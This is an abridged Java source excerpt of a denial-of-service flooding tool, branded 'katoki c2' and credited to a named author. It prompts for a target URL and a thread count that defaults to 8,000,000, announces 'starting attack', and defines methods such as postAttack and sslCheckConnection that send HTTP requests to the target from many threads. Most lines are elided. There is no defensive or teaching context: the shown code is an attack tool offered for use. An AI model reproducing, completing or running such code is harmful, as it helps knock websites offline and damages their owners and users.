...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("katoki c2 processing...: " + url);

        String[] SUrl = url.split("://");

        System.out.println("Welcome to katoki c2");
        ...
        System.out.println("katokic2 by trangiahung");

        System.out.print("Thread:mặc định 8000000 : ");
        ...
        System.out.print("method:mặc định/1000000 : ");
        ...
        System.out.println("katokiC2 by Tran Gia Hung starting attack");
    ...
    private void sslCheckConnection(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        if (responseCode == 200) {
            System.out.println("KatokiC2 processing");
        }
        Dos.url = url;
    }
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("katokiC2: " + responseCode + "Thread: " + this.seq);
    }
